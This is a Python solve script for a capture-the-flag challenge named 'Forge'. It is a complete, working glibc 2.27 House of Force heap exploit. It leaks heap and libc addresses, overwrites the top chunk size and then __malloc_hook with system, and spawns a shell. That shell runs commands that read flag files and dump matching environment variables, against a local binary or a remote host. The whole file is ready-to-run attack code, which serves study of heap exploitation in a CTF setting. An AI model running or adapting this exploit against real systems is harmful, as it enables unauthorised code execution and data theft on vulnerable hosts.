#!/usr/bin/env python3
"""CSCTF Forge: glibc 2.27 House of Force exploit.

Local:  python3 solve.py --local
Remote: python3 solve.py --host HOST --port PORT
For local mode, extract forge.tar.gz beside this script so forge, libc.so.6,
and ld-linux-x86-64.so.2 are in the same directory.
"""
import argparse
import os
import socket
import select
import struct
import subprocess
import sys
import time
from pathlib import Path

HERE = Path(__file__).resolve().parent
LIBC_MAIN_ARENA_FD = 0x3EBCA0
MALLOC_HOOK = 0x3EBC30
SYSTEM = 0x4F420
BINSH = 0x1B3D88

p64 = lambda value: struct.pack("<Q", value & 0xFFFFFFFFFFFFFFFF)
u64 = lambda data: struct.unpack("<Q", data.ljust(8, b"\0")[:8])[0]


class Tube:
    def __init__(self, host=None, port=None, local=False):
        self.process = None
        self.sock = None
        if local:
            loader = HERE / "ld-linux-x86-64.so.2"
            binary = HERE / "forge"
            if not loader.exists() or not binary.exists() or not (HERE / "libc.so.6").exists():
                raise FileNotFoundError("Extract forge.tar.gz beside solve.py first")
            self.process = subprocess.Popen(
                [str(loader), "--library-path", str(HERE), str(binary)],
                stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                cwd=str(HERE), bufsize=0,
            )
            self.reader = self.process.stdout.fileno()
            self.writer = self.process.stdin.fileno()
        else:
            self.sock = socket.create_connection((host, int(port)), timeout=12)
            self.reader = self.writer = self.sock.fileno()
        self.buffer = b""
        self.recvuntil(b"> ")

    def send(self, data):
        if self.sock:
            self.sock.sendall(data)
        else:
            os.write(self.writer, data)

    def _read(self, count):
        return self.sock.recv(count) if self.sock else os.read(self.reader, count)

    def recvuntil(self, token):
        while token not in self.buffer:
            chunk = self._read(4096)
            if not chunk:
                raise EOFError(f"connection closed: {self.buffer[-300:]!r}")
            self.buffer += chunk
        before, self.buffer = self.buffer.split(token, 1)
        return before + token

    def recvall_idle(self, idle=1.0, total=8.0):
        output, self.buffer = self.buffer, b""
        deadline = time.monotonic() + total
        while time.monotonic() < deadline:
            ready, _, _ = select.select([self.reader], [], [], min(idle, deadline - time.monotonic()))
            if not ready:
                break
            try:
                chunk = self._read(4096)
            except OSError:
                break
            if not chunk:
                break
            output += chunk
        return output

    def forge(self, size, content=b""):
        self.send(b"1\n")
        self.recvuntil(b"size> ")
        self.send(str(size).encode() + b"\n")
        self.recvuntil(b"content> ")
        self.send(content + b"\n")
        return self.recvuntil(b"\n> ")

    def inspect(self, index):
        self.send(b"3\n")
        self.recvuntil(b"index> ")
        self.send(str(index).encode() + b"\n")
        return self.recvuntil(b"\n> ")

    def melt(self, index):
        self.send(b"4\n")
        self.recvuntil(b"index> ")
        self.send(str(index).encode() + b"\n")
        return self.recvuntil(b"\n> ")

    def temper(self, index, content):
        self.send(b"2\n")
        self.recvuntil(b"index> ")
        self.send(str(index).encode() + b"\n")
        self.recvuntil(b"more content> ")
        self.send(content + b"\n")
        return self.recvuntil(b"\n> ")

    def trigger_shell(self, pointer):
        self.send(b"1\n")
        self.recvuntil(b"size> ")
        self.send(str(pointer).encode() + b"\n")

    def close(self):
        if self.sock:
            self.sock.close()
        if self.process:
            try:
                self.process.wait(timeout=2)
            except subprocess.TimeoutExpired:
                self.process.kill()
                self.process.wait()


def main():
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--local", action="store_true", help="run the bundled local challenge")
    parser.add_argument("--host", help="authorized challenge host")
    parser.add_argument("--port", type=int, help="authorized challenge port")
    args = parser.parse_args()
    if not args.local and (not args.host or args.port is None):
        parser.error("supply --local or both --host and --port")

    tube = Tube(args.host, args.port, local=args.local)
    try:
        print("[+] Connected to Forge" if not args.local else "[+] Started bundled Forge locally", flush=True)

        # Two same-sized frees leave a stale tcache fd pointer in the next chunk.
        tube.forge(0x70, b"A" * 8)       # note 0
        tube.forge(0x70, b"B" * 8)       # note 1
        tube.melt(0)
        tube.melt(1)
        tube.forge(0x70)                 # note 0 reuses the tcache entry
        heap_leak_line = tube.inspect(0).split(b"#0: ", 1)[1].split(b"\n", 1)[0]
        if len(heap_leak_line) < 6:
            raise RuntimeError("tcache pointer leak was cut by puts() at a newline byte; retry the run")
        first_chunk = u64(heap_leak_line[:6])
        print(f"[+] heap chunk pointer: {first_chunk:#x}", flush=True)

        # A 0x500 chunk enters the unsorted bin; its fd leaks main_arena.
        tube.forge(0x500, b"C")          # note 1
        tube.forge(0x20, b"D")           # note 2: guard
        tube.melt(1)
        tube.forge(0x500)                 # note 1
        arena_line = tube.inspect(1).split(b"#1: ", 1)[1].split(b"\n", 1)[0]
        # puts() terminates at a newline byte. In this pointer format, a
        # four-byte prefix means byte 4 was 0x0a and byte 5 is canonical 0x7f.
        if len(arena_line) == 4:
            arena_fd = u64(arena_line + b"\x0a\x7f")
        elif len(arena_line) >= 6:
            arena_fd = u64(arena_line[:6])
        else:
            raise RuntimeError("unsorted-bin leak was truncated before byte 4; retry the run")
        libc_base = arena_fd - LIBC_MAIN_ARENA_FD
        print(f"[+] unsorted-bin fd: {arena_fd:#x}", flush=True)
        print(f"[+] libc base:       {libc_base:#x}", flush=True)

        # The 0x18 request has a 0x20 chunk size. strlen() is 0x17, so temper()
        # begins at the final byte of the allocation and the next 8 bytes land
        # exactly on the top chunk's size field.
        tube.forge(0x18, b"E" * 0x17 + b"\0")  # note 3, adjacent to top
        tube.temper(3, b"T" + b"\xff" * 8)
        top_size_address = first_chunk + 0x650
        target = libc_base + MALLOC_HOOK - 0x10
        request = target - top_size_address - 8
        if request <= 0:
            raise RuntimeError("House of Force target calculation underflowed")
        print(f"[+] corrupted top size at: {top_size_address:#x}", flush=True)
        print(f"[+] House of Force request: {request:#x}", flush=True)

        tube.forge(request)                # note 4: move top to __malloc_hook - 0x10
        tube.forge(0x10, p64(libc_base + SYSTEM))  # note 5: overwrite __malloc_hook
        print(f"[+] __malloc_hook <- system ({libc_base + SYSTEM:#x})", flush=True)

        # malloc(size=/bin/sh) invokes system("/bin/sh") through __malloc_hook.
        binsh = libc_base + BINSH
        tube.trigger_shell(binsh)
        time.sleep(0.15)
        tube.send(
            b"echo FORGE_SHELL_SUCCESS; id; pwd; "
            b"cat /flag /flag.txt ./flag ./flag.txt /home/ctf/flag /app/flag 2>/dev/null; "
            b"find /home /app /opt /tmp -maxdepth 4 -type f "
            b"\\( -name flag -o -name flag.txt \\) -exec cat {} \\; 2>/dev/null; "
            b"env | grep -i flag; exit\n"
        )
        # The content prompt appears only after the shell exits and system() returns.
        output = tube.recvuntil(b"content> ")
        tube.send(b"\n")
        output += tube.recvuntil(b"\n> ")
        tube.send(b"5\n")
        output += tube.recvuntil(b"the fire dies down.")
        text = output.decode("utf-8", "replace")
        print(text, end="" if text.endswith("\n") else "\n")
        if "FORGE_SHELL_SUCCESS" not in text:
            raise RuntimeError("The malloc-hook shell trigger was not confirmed")
        print("[+] Shell execution confirmed")
        for line in text.splitlines():
            if "CSCTF{" in line:
                print("[+] Candidate flag:", line.strip())
    finally:
        tube.close()


if __name__ == "__main__":
    try:
        main()
    except Exception as exc:
        print(f"[-] {exc}", file=sys.stderr)
        raise
